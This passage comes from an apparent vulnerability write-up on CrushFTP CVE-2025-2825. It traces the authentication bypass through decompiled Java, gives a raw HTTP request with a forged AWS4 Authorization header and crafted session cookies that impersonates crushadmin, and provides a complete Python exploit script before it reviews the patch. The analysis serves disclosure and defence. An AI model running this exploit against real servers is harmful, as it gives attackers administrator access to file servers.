</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">boolean</span> otp_valid <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">boolean</span> verified <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>            String verify_password <span style="color:#f92672">=</span> user_pass;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>com.<span style="color:#a6e22e">crushftp</span>.<span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">Common</span>.<span style="color:#a6e22e">dmz_mode</span>) {
</span></span><span style="display:flex;"><span>               String var74;
</span></span><span style="display:flex;"><span>               label688: {
</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">if</span> (user_pass.<span style="color:#a6e22e">contains</span>(<span style="color:#e6db74">&#34;|||OTP|||&#34;</span>)) {
</span></span><span style="display:flex;"><span>                     var73 <span style="color:#f92672">=</span> ServerStatus.<span style="color:#a6e22e">thisObj</span>;
</span></span><span style="display:flex;"><span>                     <span style="color:#66d9ef">if</span> (ServerStatus.<span style="color:#a6e22e">BG</span>(<span style="color:#e6db74">&#34;otp_validated_logins&#34;</span>)) {
</span></span><span style="display:flex;"><span>                        var74 <span style="color:#f92672">=</span> user_pass.<span style="color:#a6e22e">substring</span>(0, user_pass.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;|||OTP|||&#34;</span>));
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span> label688;
</span></span><span style="display:flex;"><span>                     }
</span></span><span style="display:flex;"><span>                  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                  var74 <span style="color:#f92672">=</span> user_pass;
</span></span><span style="display:flex;"><span>               }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>               verify_password <span style="color:#f92672">=</span> var74;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            verified <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">verify_user</span>(user_name, verify_password, anyPass, doAfterLogin);
</span></span><span style="display:flex;"><span>            String last_logins2;
</span></span></code></pre></div><p>Looking into the <code>verify_user</code> , we know that it passes the value of <code>user_name</code> as parsed from the <code>Authorization</code> header and <code>anyPass</code> value as <code>true</code> , eventually after comparing certain values within the logic such as checking whether the password has been provided or other attributes, it calls the <code>UserTools.ut.verify_user</code> from <code>./11.3.0/crushftp/handlers/UserTools.java</code> file</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span> <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">verify_user</span>(String theUser, String thePass, <span style="color:#66d9ef">boolean</span> anyPass, <span style="color:#66d9ef">boolean</span> doAfterLogin) {
</span></span><span style="display:flex;"><span>      ServerStatus var10000 <span style="color:#f92672">=</span> ServerStatus.<span style="color:#a6e22e">thisObj</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>ServerStatus.<span style="color:#a6e22e">siBG</span>(<span style="color:#e6db74">&#34;allow_logins&#34;</span>)) {
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>..<span style="color:#a6e22e">snip</span>..<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>            Properties u <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Properties();
</span></span><span style="display:flex;"><span>            Properties temp_p <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Properties();
</span></span><span style="display:flex;"><span>            temp_p.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;user&#34;</span>, u);
</span></span><span style="display:flex;"><span>            temp_p.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;username&#34;</span>, theUser);
</span></span><span style="display:flex;"><span>            temp_p.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;password&#34;</span>, thePass);
</span></span><span style="display:flex;"><span>            temp_p.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;anyPass&#34;</span>, String.<span style="color:#a6e22e">valueOf</span>(anyPass));
</span></span><span style="display:flex;"><span>            checkTempAccounts(temp_p, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">uiSG</span>(<span style="color:#e6db74">&#34;listen_ip_port&#34;</span>));
</span></span><span style="display:flex;"><span>            String templateUser <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>            String SAMLResponse <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">uiSG</span>(<span style="color:#e6db74">&#34;SAMLResponse&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>temp_p.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;action&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>).<span style="color:#a6e22e">equalsIgnoreCase</span>(<span style="color:#e6db74">&#34;success&#34;</span>)) {
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">user</span> <span style="color:#f92672">=</span> UserTools.<span style="color:#a6e22e">ut</span>.<span style="color:#a6e22e">verify_user</span>(ServerStatus.<span style="color:#a6e22e">thisObj</span>, theUser, thePass, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">uiSG</span>(<span style="color:#e6db74">&#34;listen_ip_port&#34;</span>), <span style="color:#66d9ef">this</span>, <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">uiIG</span>(<span style="color:#e6db74">&#34;user_number&#34;</span>), <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">uiSG</span>(<span style="color:#e6db74">&#34;user_ip&#34;</span>), <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">uiIG</span>(<span style="color:#e6db74">&#34;user_port&#34;</span>), <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">server_item</span>, loginReason, anyPass);
</span></span><span style="display:flex;"><span>            }
</span></span></code></pre></div><p>Looking into the <code>verify_user</code> function within the <a href="http://UserTools.java"><code>UserTools.java</code></a> file, we see that it checks certain values for the password to identify it’s not of any hash type, then there stands a particular conditional branch which checks whether the given username has any of the XML file (this is used to store user’s information) and then if it does, it checks the <code>anyPass</code> value and if it is true (which it will be) and user existed, it will return the <code>user</code> meaning that user has been verified:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> Properties <span style="color:#a6e22e">verify_user</span>(ServerStatus server_status_frame, String the_user, String the_password, String serverGroup, SessionCrush thisSession, <span style="color:#66d9ef">int</span> user_number, String user_ip, <span style="color:#66d9ef">int</span> user_port, Properties server_item, Properties loginReason, <span style="color:#66d9ef">boolean</span> anyPass) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (the_user.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;\\&#34;</span>) <span style="color:#f92672">&gt;=</span> 0) {
</span></span><span style="display:flex;"><span>         the_user <span style="color:#f92672">=</span> the_user.<span style="color:#a6e22e">substring</span>(the_user.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;\\&#34;</span>) <span style="color:#f92672">+</span> 1);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>the_password.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;SHA:&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>the_password.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;SHA512:&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>the_password.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;SHA256:&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>the_password.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;SHA3:&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>the_password.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;MD5:&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>the_password.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;MD5S2:&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>the_password.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;CRYPT3:&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>the_password.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;BCRYPT:&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>the_password.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;MD5CRYPT:&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>the_password.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;PBKDF2SHA256:&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>the_password.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;SHA512CRYPT:&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>the_password.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;ARGOND:&#34;</span>)) {
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>..<span style="color:#a6e22e">snip</span>..<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>               Log.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;USER_OBJ&#34;</span>, 1, (String)(<span style="color:#e6db74">&#34;Validating user &#34;</span> <span style="color:#f92672">+</span> the_user <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; with local user file:&#34;</span> <span style="color:#f92672">+</span> (user <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">?</span> String.<span style="color:#a6e22e">valueOf</span>(user.<span style="color:#a6e22e">size</span>()) : <span style="color:#e6db74">&#34;no user.XML found!&#34;</span>)));
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">if</span> (user <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>                  loginReason.<span style="color:#a6e22e">put</span>(<span style="color:#e6db74">&#34;reason&#34;</span>, <span style="color:#e6db74">&#34;valid user&#34;</span>);
</span></span><span style="display:flex;"><span>                  ServerStatus var10000 <span style="color:#f92672">=</span> ServerStatus.<span style="color:#a6e22e">thisObj</span>;
</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">if</span> (ServerStatus.<span style="color:#a6e22e">BG</span>(<span style="color:#e6db74">&#34;secondary_login_via_email&#34;</span>) <span style="color:#f92672">&amp;&amp;</span> the_user.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;@&#34;</span>) <span style="color:#f92672">&gt;=</span> 0 <span style="color:#f92672">&amp;&amp;</span> user.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;username&#34;</span>).<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;@&#34;</span>) <span style="color:#f92672">&lt;</span> 0) {
</span></span><span style="display:flex;"><span>                     the_user <span style="color:#f92672">=</span> user.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;username&#34;</span>);
</span></span><span style="display:flex;"><span>                  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">if</span> (anyPass <span style="color:#f92672">&amp;&amp;</span> user.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;username&#34;</span>).<span style="color:#a6e22e">equalsIgnoreCase</span>(the_user)) {
</span></span><span style="display:flex;"><span>                     <span style="color:#66d9ef">return</span> user;
</span></span><span style="display:flex;"><span>                  }
</span></span></code></pre></div><hr>
<p>So an overview of this would be that the fact <code>lookup_user_pass</code> value was set to <code>true</code> by default once the S3 authentication process begins and it takes in the username provided within the header, this was later fixed, which we will analyze at the end.</p>
<h3 id="exploit-in-action-performing-auth-bypass">Exploit in Action: Performing Auth Bypass</h3>
<p>Anyways, so at this point, our Proof-Of-Concept will look like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Authorization: AWS4<span style="color:#f92672">-</span>HMAC<span style="color:#f92672">-</span>SHA256 Credentials<span style="color:#f92672">=</span>crushadmin<span style="color:#f92672">/</span>
</span></span></code></pre></div><p>But there are few things to consider as well, CrushFTP keeps the session details using <code>Cookies</code> and if you have fiddled around with enough, you would know that the two things that it validates are:</p>
<ul>
<li><code>CrushAuth</code> - A combination of timestamp and underscore followed by 30 random characters unique for each sessions</li>
<li><code>currentAuth</code> - Last 4 digits of the 30 random characters for <code>CrushAuth</code> value, this value is also sent as part of certain requests</li>
</ul>
<p>But since we already bypass the need of credentials, then we can just craft our own values for those cookies and send the request with the crafted <code>Authorization</code> header value.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>GET <span style="color:#f92672">/</span>WebInterface<span style="color:#f92672">/</span>function<span style="color:#f92672">/?</span>command<span style="color:#f92672">=</span>getXMLListing<span style="color:#f92672">&amp;</span>format<span style="color:#f92672">=</span>JSONOBJ<span style="color:#f92672">&amp;</span>path<span style="color:#f92672">=%</span>2F<span style="color:#f92672">&amp;</span>c2f<span style="color:#f92672">=</span>DICW HTTP<span style="color:#f92672">/</span>1.<span style="color:#a6e22e">1</span>
</span></span><span style="display:flex;"><span>Host: localhost:8080
</span></span><span style="display:flex;"><span>User<span style="color:#f92672">-</span>Agent: Mozilla<span style="color:#f92672">/</span>5.<span style="color:#a6e22e">0</span> (X11; Linux x86_64; rv:109.<span style="color:#a6e22e">0</span>) Gecko<span style="color:#f92672">/</span>20100101 Firefox<span style="color:#f92672">/</span>115.<span style="color:#a6e22e">0</span>
</span></span><span style="display:flex;"><span>Accept: application<span style="color:#f92672">/</span>json, text<span style="color:#f92672">/</span>javascript, <span style="color:#f92672">*/*</span>; q<span style="color:#f92672">=</span>0.<span style="color:#a6e22e">01</span>
</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">-</span>Language: en<span style="color:#f92672">-</span>US,en;q<span style="color:#f92672">=</span>0.<span style="color:#a6e22e">5</span>
</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">-</span>Encoding: gzip, deflate
</span></span><span style="display:flex;"><span>X<span style="color:#f92672">-</span>Requested<span style="color:#f92672">-</span>With: XMLHttpRequest
</span></span><span style="display:flex;"><span>Origin: http:<span style="color:#75715e">//localhost:8080</span>
</span></span><span style="display:flex;"><span>Connection: close
</span></span><span style="display:flex;"><span>Referer: http:<span style="color:#75715e">//localhost:8080/</span>
</span></span><span style="display:flex;"><span>Authorization: AWS4<span style="color:#f92672">-</span>HMAC<span style="color:#f92672">-</span>SHA256 Credential<span style="color:#f92672">=</span>crushadmin<span style="color:#f92672">/</span>
</span></span><span style="display:flex;"><span>Cookie: CrushAuth<span style="color:#f92672">=</span>1743325521538_Ea7AKKpFXuEHX89Jjdnp04TFyhDiCw; currentAuth<span style="color:#f92672">=</span>DiCW
</span></span></code></pre></div><p>Sending the request to get the current session user, we could see that the CrushFTP thinks the current user session which requested is <code>crushadmin</code></p>
<p><img src="/img/crushftp-cve-2025-2825/image_1.png" alt="Untitled"></p>
<p>We can also try to list the directories, it may seem the response has no such data we can use, this is because the docker I had was not configured due to docker image limitations.</p>
<p><img src="/img/crushftp-cve-2025-2825/image_2.png" alt="Untitled"></p>
<p>Now that is done, I created a quick python script which accepts the URL and performs the check on the remote host whether to see if it is vulnerable or not:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
</span></span><span style="display:flex;"><span>from random <span style="color:#f92672">import</span> choice
</span></span><span style="display:flex;"><span>from urllib.<span style="color:#a6e22e">parse</span> <span style="color:#f92672">import</span> urlparse
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">CrushFTPAuthBypassExploit</span>:
</span></span><span style="display:flex;"><span>    def <span style="color:#a6e22e">__init__</span>(self, target_url, valid_username):
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        Initialize the exploit for CrushFTP
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        :param target_url: The CrushFTP server endpoint
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        :param valid_username: A valid CrushFTP username to exploit
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        self.<span style="color:#a6e22e">target_url</span> <span style="color:#f92672">=</span> target_url
</span></span><span style="display:flex;"><span>        self.<span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> valid_username
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    def <span style="color:#a6e22e">exploit</span>(self):
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        Attempt to exploit the CrushFTP authentication bypass
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        :return: Response details
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        chars <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#34;</span>
</span></span><span style="display:flex;"><span>        crushAuth <span style="color:#f92672">=</span> str(<span style="color:#66d9ef">int</span>(time.<span style="color:#a6e22e">time</span>())) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;_&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#34;</span>.<span style="color:#a6e22e">join</span>(<span style="color:#f92672">[</span>choice(chars) <span style="color:#66d9ef">for</span> _ in <span style="color:#a6e22e">range</span>(30)<span style="color:#f92672">]</span>)
</span></span><span style="display:flex;"><span>        currentAuth <span style="color:#f92672">=</span> crushAuth<span style="color:#f92672">[-</span>4:<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>        cookies <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;CrushAuth&#34;</span>: crushAuth, <span style="color:#e6db74">&#34;currentAuth&#34;</span>: currentAuth}
</span></span><span style="display:flex;"><span>        headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#960050;background-color:#1e0010">&#39;</span>Authorization<span style="color:#960050;background-color:#1e0010">&#39;</span>: f<span style="color:#e6db74">&#34;AWS4-HMAC-SHA256 Credential={self.username}/&#34;</span>,
</span></span><span style="display:flex;"><span>            <span style="color:#960050;background-color:#1e0010">&#39;</span>Host<span style="color:#960050;background-color:#1e0010">&#39;</span>: urlparse(self.<span style="color:#a6e22e">target_url</span>).<span style="color:#a6e22e">hostname</span>,
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">#</span> Attempt to access a <span style="color:#66d9ef">protected</span> resource
</span></span><span style="display:flex;"><span>        target_url <span style="color:#f92672">=</span> f<span style="color:#e6db74">&#34;{self.target_url}/WebInterface/function/?command=getUserName&amp;format=JSONOBJ&amp;c2f=&#34;</span> <span style="color:#f92672">+</span> currentAuth
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            response <span style="color:#f92672">=</span> requests.<span style="color:#a6e22e">post</span>(target_url, headers<span style="color:#f92672">=</span>headers,cookies<span style="color:#f92672">=</span>cookies, verify<span style="color:#f92672">=</span>False)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#960050;background-color:#1e0010">&#39;</span>status_code<span style="color:#960050;background-color:#1e0010">&#39;</span>: response.<span style="color:#a6e22e">status_code</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#960050;background-color:#1e0010">&#39;</span>response_text<span style="color:#960050;background-color:#1e0010">&#39;</span>: response.<span style="color:#a6e22e">text</span>,
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        except Exception as e:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> {
</span></span><span style="display:flex;"><span>                <span style="color:#960050;background-color:#1e0010">&#39;</span>error<span style="color:#960050;background-color:#1e0010">&#39;</span>: str(e)
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">#</span> Set up argument parsing <span style="color:#66d9ef">for</span> target URL and username
</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse.<span style="color:#a6e22e">ArgumentParser</span>(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Run the CrushFTP authentication bypass exploit.&#34;</span>)
</span></span><span style="display:flex;"><span>    parser.<span style="color:#a6e22e">add_argument</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span>target_url<span style="color:#960050;background-color:#1e0010">&#39;</span>, type<span style="color:#f92672">=</span>str, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Target URL of the CrushFTP server (e.g., http://localhost:8080)&#34;</span>)
</span></span><span style="display:flex;"><span>    parser.<span style="color:#a6e22e">add_argument</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">--</span>valid_username<span style="color:#960050;background-color:#1e0010">&#39;</span>, type<span style="color:#f92672">=</span>str, <span style="color:#66d9ef">default</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;crushadmin&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;A known valid username on the target system (default: crushadmin)&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">#</span> Parse arguments
</span></span><span style="display:flex;"><span>    args <span style="color:#f92672">=</span> parser.<span style="color:#a6e22e">parse_args</span>()
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">#</span> Run the exploit with the provided arguments
</span></span><span style="display:flex;"><span>    exploit <span style="color:#f92672">=</span> CrushFTPAuthBypassExploit(
</span></span><span style="display:flex;"><span>    target_url<span style="color:#f92672">=</span>args.<span style="color:#a6e22e">target_url</span>,
</span></span><span style="display:flex;"><span>    valid_username<span style="color:#f92672">=</span>args.<span style="color:#a6e22e">valid_username</span>
</span></span><span style="display:flex;"><span>    )
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[*] CrushFTP Authentication Bypass Exploit&#34;</span>)
</span></span><span style="display:flex;"><span>    print(f<span style="color:#e6db74">&#34;[*] Targeting: {args.target_url}&#34;</span>)
</span></span><span style="display:flex;"><span>    print(f<span style="color:#e6db74">&#34;[*] Using username: {args.valid_username}&#34;</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> exploit.<span style="color:#a6e22e">exploit</span>()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;crushadmin&#34;</span> in result<span style="color:#f92672">[</span><span style="color:#960050;background-color:#1e0010">&#39;</span>response_text<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">]</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[+] CrushFTP Server is Vulnerable!&#34;</span>)
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[+] Exploit Result:\n&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> key, value in result.<span style="color:#a6e22e">items</span>():
</span></span><span style="display:flex;"><span>            print(f<span style="color:#e6db74">&#34;{key.title()}: {value}&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[!] Not Vulnerable!&#34;</span>)
</span></span></code></pre></div><p>Proof-Of-Concept can be found <a href="https://github.com/pwnfuzz/POCs/blob/main/CVE%202025-2825">here</a>.</p>
<p><img src="/img/crushftp-cve-2025-2825/image_3.png" alt="Untitled"></p>
<h3 id="evaluating-patched-version">Evaluating Patched Version</h3>
<p>Looking into the code, we see that now the applications checks whether the S3 authentication is supported or not, if not it will terminate the request with <code>AWS4-HMAC...</code> type. This is a good fix in itself as previously one can do authentication bypass even on servers with no S3 configuration.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">[</span>..<span style="color:#a6e22e">snip</span>..<span style="color:#f92672">]</span>          
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">boolean</span> lookup_user_pass <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (s3_username.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;~&#34;</span>) <span style="color:#f92672">&gt;=</span> 0) {
</span></span><span style="display:flex;"><span>               user_pass <span style="color:#f92672">=</span> s3_username.<span style="color:#a6e22e">substring</span>(s3_username.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;~&#34;</span>) <span style="color:#f92672">+</span> 1);
</span></span><span style="display:flex;"><span>               user_name <span style="color:#f92672">=</span> s3_username.<span style="color:#a6e22e">substring</span>(0, s3_username.<span style="color:#a6e22e">indexOf</span>(<span style="color:#e6db74">&#34;~&#34;</span>));
</span></span><span style="display:flex;"><span>               lookup_user_pass <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>               var10000 <span style="color:#f92672">=</span> ServerStatus.<span style="color:#a6e22e">thisObj</span>;
</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>ServerStatus.<span style="color:#a6e22e">BG</span>(<span style="color:#e6db74">&#34;s3_auth_lookup_password_supported&#34;</span>)) {
</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>               }
</span></span><span style="display:flex;"><span>            }
</span></span></code></pre></div><p>The following lines were added instead of the <code>login_user_check</code> call that we saw before, here the application tries to fetch the user’s <code>linkedServer</code> property which we can safely assume to be one of those properties which specifies whether the user has S3 authentication is enabled. If it is, internally it performs the proper check for the provided password.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>            Properties tmp_user <span style="color:#f92672">=</span> UserTools.<span style="color:#a6e22e">ut</span>.<span style="color:#a6e22e">getUser</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">thisSession</span>.<span style="color:#a6e22e">server_item</span>.<span style="color:#a6e22e">getProperty</span>(<span style="color:#e6db74">&#34;linkedServer&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>), user_name);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (tmp_user <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> lookup_user_pass) {
